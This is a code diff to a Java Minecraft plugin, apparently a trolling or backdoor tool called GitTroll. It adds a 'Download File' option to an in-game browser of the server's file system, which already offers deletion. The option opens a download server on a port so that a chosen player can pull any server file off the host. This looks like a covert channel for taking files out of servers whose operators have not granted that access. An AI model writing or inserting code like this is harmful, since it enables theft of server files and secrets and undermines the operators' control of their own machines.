@@ -27,6 +27,7 @@ import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
 import net.Lenni0451.GitTroll.event.types.Event;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
+import net.Lenni0451.GitTroll.utils.FileDownloadServer;
 import net.Lenni0451.GitTroll.utils.ItemStackUtils;
 
 public class FileBrowser extends CommandBase implements Listener, EventListener {
@@ -87,6 +88,10 @@ public class FileBrowser extends CommandBase implements Listener, EventListener 
 			}
 			{ //Delete
 				ItemStack stack = ItemStackUtils.generateNew(Material.BARRIER, "§6Delete File", 1, 15);
+				inv.addItem(stack);
+			}
+			{ //Download
+				ItemStack stack = ItemStackUtils.generateNew(Material.HOPPER, "§6Download File", 1, 15);
 				inv.addItem(stack);
 			}
 		} else {
@@ -224,6 +229,16 @@ public class FileBrowser extends CommandBase implements Listener, EventListener 
 					} catch (Throwable e) {
 						player.sendGitMessage("§cYou don't have enough permissions to open this folder.");
 						this.currentFiles.put(player, current);
+					}
+				} else if(clickedItem.getItemMeta().getDisplayName().equals("§6Download File") && clickedItem.getType().equals(Material.HOPPER)) {
+					try {
+						player.getPlayer().closeInventory();
+						FileDownloadServer fds = new FileDownloadServer(current);
+						player.sendGitMessage("Connect with the file download client to download the requested file.");
+						player.sendGitMessage("The port is §6" + fds.getPort() + " §a. You have §62 Minutes §ato download the file.");
+					} catch (Throwable e) {
+						player.sendGitMessage("§cThe download Server could not be started.");
+						player.sendGitMessage("§6" + e.getClass().getSimpleName() + (e.getMessage() == null ? "" : (" " + e.getMessage())));
 					}
 				}
 			}
